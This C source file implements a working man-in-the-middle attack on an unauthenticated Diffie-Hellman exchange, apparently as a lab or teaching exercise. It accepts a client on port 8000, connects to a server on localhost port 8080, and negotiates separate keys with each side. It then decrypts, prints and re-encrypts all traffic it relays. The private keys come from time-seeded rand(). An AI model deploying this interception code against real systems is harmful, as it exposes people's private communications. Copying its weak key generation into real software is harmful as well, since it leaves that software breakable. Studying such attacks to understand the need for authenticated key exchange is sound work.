#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>
#include <sys/select.h>
#include <arpa/inet.h>

#include "dh.h"
#include "../crypto/crypto.h"


void dh_client(int client_socket, unsigned char *client_aes_key)
{
    BN_CTX *ctx = BN_CTX_new();

    BIGNUM *client_sec = BN_new();
    BIGNUM *client_share = BN_new();
    BIGNUM *secret = BN_new();
    BIGNUM *client_public = BN_new();

    char buf[514];
    char x[513];

    char hexa[] = {
        '0','1','2','3','4','5','6','7', '8','9','A','B','C','D','E','F'};

    for (int i = 0; i < 512; i++)
        x[i] = hexa[rand() % 16];

    x[512] = '\0';

    printf("Client side private-key%s:  \n", x);
    BN_hex2bn(&client_sec, x);

    sq_mult(client_sec, client_share, ctx);

    printf("MITM Fake server share: ");
    BN_print_fp(stdout, client_share);
    printf("\n");

    int n = read(client_socket, buf, sizeof(buf) - 1);

    buf[n] = '\0';

    BN_hex2bn(&client_public, buf);

    char *share = BN_bn2hex(client_share);

    write(client_socket, share, strlen(share));

    OPENSSL_free(share);

    

    secret_maker(client_public, client_sec, secret, ctx);
    printf("MITM Client-side shared secret:\n");
    BN_print_fp(stdout, secret);
    printf("\n");


    derive_aes_key(secret, client_aes_key);

    printf("MITM Client AES key: ");
    print_hex("", client_aes_key, AES_KEY_SIZE);


    BN_free(client_sec);
    BN_free(client_share);
    BN_free(secret);
    BN_free(client_public);

    BN_CTX_free(ctx);
}
void dh_server(int server_socket, unsigned char *server_aes_key)
{
    BN_CTX *ctx = BN_CTX_new();

    BIGNUM *client_sec = BN_new();
    BIGNUM *client_share = BN_new();
    BIGNUM *secret = BN_new();
    BIGNUM *server_public = BN_new();

    char buf[513];
    char x[513];

    char hexa[] = {
        '0','1','2','3','4','5','6','7', '8','9','A','B','C','D','E','F'};

    for (int i = 0; i < 512; i++)
        x[i] = hexa[rand() % 16];

    x[512] = '\0';

    printf("Server side private-key%s:  \n", x);
    BN_hex2bn(&client_sec, x);

    sq_mult(client_sec, client_share, ctx);

    printf("MITM Fake client share: ");
    BN_print_fp(stdout, client_share);
    printf("\n");

    char *share = BN_bn2hex(client_share);

    write(server_socket, share, strlen(share));

    OPENSSL_free(share);

    int n = read(server_socket, buf, sizeof(buf) - 1);

    buf[n] = '\0';

    BN_hex2bn(&server_public, buf);

    printf("Server share: ");
    BN_print_fp(stdout, server_public);
    printf("\n");

    secret_maker(server_public, client_sec, secret, ctx);

    printf("[MITM] Server-side shared secret:\n");
    BN_print_fp(stdout, secret);
    printf("\n");

    derive_aes_key(secret, server_aes_key);

    printf("[MITM] Server AES key: ");
    print_hex("", server_aes_key, AES_KEY_SIZE);

    BN_free(client_sec);
    BN_free(client_share);
    BN_free(secret);
    BN_free(server_public);

    BN_CTX_free(ctx);
}

int main(){
    int s,client_socket;
    int server_socket;

    struct sockaddr_in addr = {0};
    struct sockaddr_in server_addr = {0};

    unsigned char client_aes_key[AES_KEY_SIZE];
    unsigned char server_aes_key[AES_KEY_SIZE];

    srand(time(NULL));

    s = socket(AF_INET, SOCK_STREAM, 0);
    if(s< 0){
        printf("Socket failed");
    }
    
    addr.sin_family = AF_INET;
    addr.sin_port = htons(8000);
    addr.sin_addr.s_addr = INADDR_ANY;

    bind(s, (struct sockaddr*)&addr, sizeof(addr));

    listen(s, 10);

    printf("MITM Listening for client on port 8000\n\n");

    client_socket = accept(s, NULL, NULL);

    printf("MIT Client connected. Socket: %d\n", client_socket);

    server_socket = socket(AF_INET, SOCK_STREAM, 0);

    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(8080);

    inet_pton( AF_INET, "127.0.0.1", &server_addr.sin_addr );

    connect( server_socket, (struct sockaddr *)&server_addr, sizeof(server_addr));

    printf("MITM : Connected to the real server, SOcket : %d\n", server_socket);

    init_dh_params();

    printf("Starting DH with client\n");
    dh_client(client_socket, client_aes_key);

    printf("Starting DH with server\n");

    dh_server(server_socket, server_aes_key);
    printf("MITM: DH Completed\n\n");

    while(1){
        fd_set readfds;

        FD_ZERO(&readfds);

        FD_SET (client_socket, &readfds);
        FD_SET(server_socket, &readfds);

        int max_fd  = client_socket;

        if(server_socket >max_fd){
            max_fd = server_socket;

        }
        select(max_fd +1, &readfds, NULL, NULL, NULL);

        if(FD_ISSET(client_socket, &readfds))
        {
            unsigned char encrypted[2048];
            unsigned char plaintext[2048];
            unsigned char encrypted_again[2048];

            int n = read(client_socket, encrypted, sizeof(encrypted));

            if(n <= 0){
                break;
            }
            printf("\n");

            int plaintext_len = decrypt_message(encrypted, n, client_aes_key, plaintext);
            if(plaintext_len <0){
                printf("Decryption failed\n\n");
                continue;
            }

            plaintext[plaintext_len] = '\0';
            printf("PLaintext from client: %s\n", plaintext);

            int encrypted_len = encrypt_message(plaintext, plaintext_len, server_aes_key, encrypted_again);

            // printf("Encrypted packets, sending to the server:");
            // for (int j = 0; j < n; j++)
            //     {
            //         printf("%02x", encrypted_again[j]);
            //     }

            write(server_socket, encrypted_again, encrypted_len);
            fflush(stdout);
        }

        if(FD_ISSET(server_socket, &readfds))
        {
            unsigned char encrypted[2048];
            unsigned char plaintext[2048];
            unsigned char encrypted_again[2048];

            int n = read(server_socket, encrypted, sizeof(encrypted));

            if(n <= 0){
                break;
            }
            printf("\n");

            // printf("Before decrypt\n");
            int plaintext_len = decrypt_message(encrypted, n, server_aes_key, plaintext);
            
            // printf("After decrypt\n");
            if(plaintext_len <0){
                printf("Decryption failed");
                continue;
            }

            plaintext[plaintext_len] = '\0';
            printf("PLaintext from Server: %s\n", plaintext);

            int encrypted_len = encrypt_message(plaintext, plaintext_len, client_aes_key, encrypted_again);

            write(client_socket, encrypted_again, encrypted_len);
            fflush(stdout);
        }


    }
    close(client_socket);
    close(server_socket);
    free_dh_params();
    return 0;
}